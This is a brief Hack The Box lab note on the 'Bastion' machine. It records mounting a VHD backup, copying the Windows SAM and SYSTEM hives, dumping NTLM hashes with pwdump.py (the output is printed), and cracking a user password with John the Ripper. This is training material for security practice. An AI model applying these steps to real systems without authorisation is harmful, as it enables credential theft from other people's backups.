# Mounting VHD image
Mounting VHD image on local kali VM via guestmount tool using command `guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 --ro ~/Dropbox/Documents/htb/boxes/Bastion/mount` [method](https://serverok.in/how-to-open-a-vhd-or-vhdx-file-in-linux)
![[Pasted image 20210714110734.png]]
## Copying SAM file to local kali VM
Copying SAM and SYSTEM file to local kali VM found in `/Windows/System32/config` .
![[Pasted image 20210714111426.png]]
## Using pwdump.py to dump hashes
Used `python3 /usr/share/creddump7/pwdump.py SYSTEM SAM` to dump hashes to a file.
```bash
❯ python3 /usr/share/creddump7/pwdump.py SYSTEM SAM  | tee hash.hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
## Cracked password for 'L4mpje' user
Cracked password for 'L4mpje' user via JohnTheRipper.
![[Pasted image 20210714121401.png]]


